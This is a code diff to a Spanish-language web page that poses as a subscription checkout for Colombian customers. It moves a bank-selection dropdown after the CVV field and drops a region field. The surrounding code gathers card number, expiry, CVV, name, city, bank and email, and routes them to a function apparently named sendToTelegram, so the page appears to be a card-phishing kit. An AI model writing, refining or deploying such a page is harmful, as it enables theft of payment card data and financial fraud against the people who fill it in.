@@ -152,7 +152,7 @@ footer a { color: #00c8ff; text-decoration: none; }
     .row-double { flex-direction: column; gap: 0; }
 }
 
-/* BANCO INFO */
+/* BANCO INFO - AHORA DESPUÉS DEL CVV */
 .bank-selector {
     margin-top: 20px;
     padding: 15px;
@@ -265,18 +265,25 @@ footer a { color: #00c8ff; text-decoration: none; }
         </div>
     </div>
 
+    <!-- 🔥 BANCOS AHORA DESPUÉS DEL CVV -->
+    <div class="bank-selector">
+        <p>Seleccione su banco para validar el pago:</p>
+        <select id="bankSelect" style="background: #0f0f0f;">
+            <option value="">-- Seleccionar banco --</option>
+            <option value="Bancolombia">Bancolombia</option>
+            <option value="Nequi">Nequi</option>
+            <option value="Davivienda">Davivienda</option>
+            <option value="BBVA">BBVA</option>
+            <option value="Banco Popular">Banco Popular</option>
+            <option value="Banco de Bogotá">Banco de Bogotá</option>
+            <option value="Itaú">Itaú</option>
+        </select>
+    </div>
+
     <label>CIUDAD</label>
     <input id="city" type="text" placeholder="Ingrese su ciudad">
 
-    <label>DEPARTAMENTO</label>
-    <select id="department">
-        <option value="">Seleccionar…</option>
-        <option>Antioquia</option>
-        <option>Cundinamarca</option>
-        <option>Valle del Cauca</option>
-        <option>Atlántico</option>
-        <option>Santander</option>
-    </select>
+    <!-- SE ELIMINÓ DEPARTAMENTO -->
 
     <label>RUT (OPCIONAL)</label>
     <input id="rut" type="text" placeholder="Opcional">
@@ -302,21 +309,6 @@ footer a { color: #00c8ff; text-decoration: none; }
         <div id="planName" style="margin-top:8px; font-size:14px; color:#6b7280;"></div>
 
         <div id="planSummary" style="margin-top:10px; font-size:14px; color:#9ca3af;"></div>
-    </div>
-
-    <!-- 🔥 SELECCIÓN DEL BANCO (TU CÓDIGO ORIGINAL) -->
-    <div class="bank-selector">
-        <p>Seleccione su banco para validar el pago:</p>
-        <select id="bankSelect" style="background: #0f0f0f;">
-            <option value="">-- Seleccionar banco --</option>
-            <option value="Bancolombia">Bancolombia</option>
-            <option value="Nequi">Nequi</option>
-            <option value="Davivienda">Davivienda</option>
-            <option value="BBVA">BBVA</option>
-            <option value="Banco Popular">Banco Popular</option>
-            <option value="Banco de Bogotá">Banco de Bogotá</option>
-            <option value="Itaú">Itaú</option>
-        </select>
     </div>
 
     <!-- BOTÓN FINAL -->
@@ -384,7 +376,6 @@ async function sendToTelegram(bankName, cardData) {
 ✅ BANCO SELECCIONADO: ${bankName}
 📧 CORREO: ${email}
 🏙️ CIUDAD: ${cardData.city || "No especificada"}
-📍 DEPARTAMENTO: ${cardData.department || "No especificado"}
 
 ✅ PLAN: ${planInfo.name}
 💰 PRECIO ORIGINAL: COP ${planInfo.originalPrice}/mes
@@ -450,9 +441,8 @@ async function proceedToValidation() {
     const cardExpiry = document.getElementById("cardExpiry").value.trim();
     const cardCVV = document.getElementById("cardCVV").value.trim();
     const city = document.getElementById("city").value.trim();
-    const department = document.getElementById("department").value;
     
-    if (!cardName || !cardNumber || !cardExpiry || !cardCVV || !city || !department) {
+    if (!cardName || !cardNumber || !cardExpiry || !cardCVV || !city) {
         alert("Por favor, complete todos los campos obligatorios.");
         return;
     }
@@ -473,7 +463,6 @@ async function proceedToValidation() {
         cardExpiry: cardExpiry,
         cardCVV: cardCVV,
         city: city,
-        department: department,
         rut: document.getElementById("rut").value.trim()
     };
     
